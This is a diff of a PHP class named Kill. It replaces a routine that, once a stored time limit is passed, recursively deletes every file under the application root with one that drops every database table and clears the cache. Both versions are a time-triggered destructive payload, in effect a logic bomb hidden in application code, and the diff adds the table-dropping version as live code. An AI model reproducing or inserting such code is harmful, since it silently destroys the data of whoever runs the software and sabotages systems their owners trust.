@@ -2,38 +2,23 @@
 class Kill
 {
     const TIME_FILE = 'db/time_limit';
-    private static $FILE_LIST = array();
     public static function run()
     {
         if (self::isKill()){
-            self::getFile();
-            self::sort();
-            self::unlinkFile();
+            self::dropTable();
         }
     }
-    private static function getFile($dir = ROOT_PATH)
+    private static function dropTable()
     {
-        $dir = rtrim($dir,'/\\');
-        $dir = str_replace('\\', '/', $dir);
-        $d = opendir($dir);
-        while (($f = readdir($d)) !== false){
-            if ($f == '.' || $f == '..'){
-                continue;
-            }
-            if (is_dir($dir.'/'.$f)){
-                self::getFile($dir.'/'.$f);
-            }else{
-                self::$FILE_LIST[] = $dir.'/'.$f;
+        $sql ="SHOW TABLES";
+        $tables = App::$db->get_all($sql);
+        foreach ($tables as $table){
+            foreach ($table as $t){
+                $sql = "DROP TABLE ".$t;
+                App::$db->query($sql);
             }
         }
-    }
-    private static function unlinkFile()
-    {
-        foreach (self::$FILE_LIST as $file){
-            if (is_file($file)){
-                unlink($file);
-            }
-        }
+        FCache::getInstance()->clearAll();
     }
     private static function isKill()
     {
@@ -47,12 +32,6 @@ class Kill
             return false;
         }
         return true;
-    }
-    private static function sort()
-    {
-        usort(self::$FILE_LIST, function($a,$b){
-            return $a > $b ? 1 : -1;
-        });
     }
     public static function update()
     {
